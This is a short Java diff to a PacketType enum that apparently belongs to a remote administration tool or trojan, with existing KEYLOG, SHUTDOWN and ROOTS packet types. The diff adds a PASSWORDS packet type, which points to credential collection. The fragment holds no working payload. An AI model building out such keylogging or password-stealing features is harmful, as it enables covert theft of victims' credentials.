@@ -49,7 +49,8 @@ public enum PacketType {
 	KEYLOG(26, KeylogPacket.class),
 	SHUTDOWN(27, ShutdownPacket.class),
 	RESTART(28, RestartPacket.class),
-	ROOTS(29, RootRequestPacket.class);
+	ROOTS(29, RootRequestPacket.class),
+	PASSWORDS(30, PasswordPacket.class);
 	
 	public final byte id;
 	public final Class<? extends IPacket> clazz;
